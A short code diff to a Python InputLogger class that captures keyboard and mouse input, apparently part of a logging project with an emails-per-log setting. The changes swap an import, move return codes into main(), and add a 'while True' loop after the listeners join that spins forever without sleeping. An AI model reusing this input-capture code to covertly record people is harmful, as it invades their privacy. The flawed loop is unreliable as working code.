@@ -4,7 +4,7 @@ from datetime import datetime
 from os.path import join
 
 from config import LOGS_DIRECTORY_PATH, INPUT_LOGS_PER_EMAIL
-from utils.tools import log
+from utils.utils import log
 
 
 class InputLogger:
@@ -42,14 +42,15 @@ class InputLogger:
             ) as mouse_listener:
                 keyboard_listener.join()
                 mouse_listener.join()
+            while True:
+                if not self.running:
+                    keyboard_listener.stop()
+                    mouse_listener.stop()
         except KeyboardInterrupt:
             self.running = False
         except Exception as e:
             log("AN ERROR OCCURED WHILE LOGGING INPUT:", "errors.txt")
             log(e)
-            return 1
-
-        return 0
 
 
 def main():
@@ -60,6 +61,9 @@ def main():
         input_logger.running = False
         print("An error occured while logging input.")
         print(f"See error here: ")  # put the file path to where the error log is
+        return 1
+
+    return 0
 
 
 if __name__ == "__main__":
